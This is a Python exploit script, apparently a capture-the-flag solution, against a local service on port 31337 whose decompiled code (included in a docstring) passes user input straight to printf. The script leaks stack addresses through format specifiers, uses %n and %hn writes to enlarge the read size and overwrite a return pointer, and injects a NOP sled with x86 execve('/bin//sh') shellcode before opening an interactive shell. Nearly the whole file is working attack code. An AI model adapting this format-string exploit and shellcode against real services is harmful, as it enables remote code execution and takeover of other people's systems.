#! python3


"""

%1$x -> buf_size
$2$x -> 0x0a

%5$x -> pointer to input value

%7$x -> Input value


~~~

~~~
int vuln_func()
{
	int buf_size = 13;
	char buf[1024];
	while (1) {
		eax = 1023;
		if (buf_size <= 1023) {
			eax = buf_size;
		}
		printf("Reading %d bytes\n", buf_size);
		scan_string(buf, buf_size, eax);
		printf(buf);
	}
	return 0;
}
"""


from telnetlib import Telnet
import struct


HOST = 'localhost'
PORT = '31337'


def pack_I(addr):
    return struct.pack('<I', addr)
    

def get_addr(conn, pos):
    
    conn.read_until(b' bytes\n')
    conn.write('%{0}$p\n'.format(pos).encode())
    addr = conn.read_until(b'\n')
    return addr.decode()


def exploit(conn):

    shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
    
    
    # ptr_input : pos -> %7$p
    ptr_input = int(get_addr(conn, 5), 16)

    #ptr_buf_size = ptr_input - 0x4*6
    ptr_buf_size = ptr_input - 0x4*3
    ptr_write = ptr_input - 0x4*8
    sc_addr = ptr_input + 32

    val1 = (sc_addr >> 16) & 0xffff
    val2 = sc_addr & 0xffff
    
    payload =  pack_I(ptr_buf_size+3)
    payload += b'%7$n'
    
    sock = conn.get_socket()

    print('ptr_input\t: {}'.format(hex(ptr_input)))
    print('ptr_buf_size\t: {}'.format(hex(ptr_buf_size)))

    input('gdb?')
    
    sock.send(payload + b'\n')
    
    print('write_ptr\t: {}'.format(hex(ptr_write)))
    print('sc_addr\t: {}'.format(hex(sc_addr)))
    
    payload  = pack_I(ptr_write) + pack_I(ptr_write+0x2)
    payload += '%{0}x%{1}$hn%{2}x%{3}$hn'.format(val2-8, 7, val1-val2, 8).encode()
    payload += b'\x90'* 0x20 + shellcode
    
    sock.send(payload + b'\n')

    # Prevent from UnicodeDecodeError
    conn.write(b'echo pwned\n')
    conn.read_until(b'pwned\n')

    conn.interact()
                
def main():
    tn = Telnet(HOST, PORT)
    exploit(tn)
    
if __name__ == '__main__':
    main()
